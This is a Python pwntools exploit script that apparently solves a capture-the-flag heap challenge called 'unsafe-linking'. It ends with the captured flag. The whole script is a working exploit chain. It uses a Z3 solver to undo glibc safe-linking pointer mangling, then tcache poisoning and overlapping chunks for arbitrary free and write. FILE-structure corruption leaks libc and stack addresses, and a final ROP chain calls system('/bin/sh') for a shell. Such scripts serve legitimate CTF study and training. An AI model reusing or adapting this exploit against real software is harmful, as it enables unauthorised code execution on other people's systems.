from pwn import *
from z3 import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./unsafe-linking', '''
    continue
''')

# p = remote('recruit.osiris.bar', 21006)

def create_note_without_secret(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0/1)\n', b'0')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b':\n', data)

def create_note_with_secret(idx, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0/1)\n', b'1')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendafter(b':\n', data)

def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'?\n', str(idx).encode())

def read_node(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.recvuntil(b'Secret ')
    leak1 = int(p.recvuntil(b"(").decode()[:-1], 16)
    p.recvuntil(b"off= ")
    leak2 = int(p.recvuntil(b")").decode()[:-1], 16)
    return leak1, leak2

def solve1(secret, offset):
    # This is a Z3 solver to retrieve the content of the note
    protected = BitVec('protected', 64)
    random = BitVec('random', 64)
    s = Solver()
    s.add((random&0xfffffff000000000)==0)
    s.add((protected^random)==secret)
    s.add((random-(protected>>12))==offset)
    assert s.check() == sat
    return s.model()[protected].as_long()

def solve2(protected, current_offset, next_offset):
    # This is a Z3 solver to retrieve the heap base address generally
    base = BitVec('base', 64)
    if next_offset==0:
        next_offset = -base
    s = Solver()
    s.add(base&0xfff==0)
    s.add(((base+current_offset)>>12)^(base+next_offset)==protected)
    assert s.check() == sat
    return s.model()[base].as_long()

def arbitrary_free(addr_to_free):
    # This is a method to free an arbitrary address
    create_note_without_secret(1, 0x20, b'\n')
    create_note_without_secret(2, 0x20, b'\n')
    delete_note(1)
    delete_note(2)
    create_note_with_secret(3, p64(addr_to_free))
    delete_note(1)

def arbitary_write(large_chunk_addr, addr_to_write, data_to_write):
    # This is a method to write data to an arbitrary address
    create_note_without_secret(4, 0xa0, b'A'*(0x10+0x8)+(p64(0x41)+b"B"*0x38)*2+b'\n')
    arbitrary_free(large_chunk_addr+0x10+0x8+0x8+0x40)
    arbitrary_free(large_chunk_addr+0x10+0x8+0x8)
    delete_note(4)
    create_note_without_secret(5, 0xa0, b'C'*(0x10+0x8)+p64(0x41)+p64(((large_chunk_addr+0x10+0x8+0x8)>>12)^addr_to_write)+b'\n')
    create_note_without_secret(6, 0x38, b'\n')
    create_note_without_secret(7, 0x38, data_to_write+b'\n')

glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')

# Stage1: Leak heap base address (normal decrypt safe linking)
create_note_with_secret(0, b'\n')
delete_note(0)
create_note_with_secret(0, b'\n')
secret, offset = read_node(0)
heap_base_addr = solve2(solve1(secret, offset), 0x1490, 0)
log.info(f'heap base address: {hex(heap_base_addr)}')

# Stage2: Leak libc base address (overlapping chunks with tcache poisoning; attack the File Structure in the heap to print the stdout address in _chain)
arbitary_write(heap_base_addr+0x14f0, heap_base_addr+0x2a8-0x8, p64(0xfbad2488)+p64(heap_base_addr+0x308)+p64(heap_base_addr+0x308+0x8)+p64(heap_base_addr+0x308+0x8))
glibc_base_addr = u64(p.recvuntil(b'======= NYUSec =======')[0:6].ljust(8, b'\x00'))-glibc_e.symbols['_IO_2_1_stdout_']
log.info(f'glibc base address: {hex(glibc_base_addr)}')

# Stage3: Leak stack address (overlapping chunks with tcache poisoning; attack the File Structure in the heap to print the environ stack address)
arbitary_write(heap_base_addr+0x16a0, heap_base_addr+0x2a8-0x8, p64(0xfbad2488)+p64(glibc_base_addr+glibc_e.symbols.environ)+p64(glibc_base_addr+glibc_e.symbols.environ+0x8)+p64(glibc_base_addr+glibc_e.symbols.environ+0x8))
create_return_addr = u64(p.recvuntil(b'======= NYUSec =======')[0:6].ljust(8, b'\x00'))-0x140
log.info(f'create return address: {hex(create_return_addr)}')

# Stage4: Pop a shell (overlapping chunks with tcache poisoning; attack the return address of create function to ROP to call system("/bin/sh"))
chain = [
    glibc_r.rdi.address+glibc_base_addr,
    next(glibc_e.search(b"/bin/sh"))+glibc_base_addr,
    glibc_r.ret.address+glibc_base_addr,
    glibc_e.symbols.system+glibc_base_addr
]
arbitary_write(heap_base_addr+0x17f0, create_return_addr-0x8, p64(0)+b"".join([p64(addr) for addr in chain]))

p.interactive()

# flag{ea00610ef917558d1cffe6ce257279dcc8641b3d}
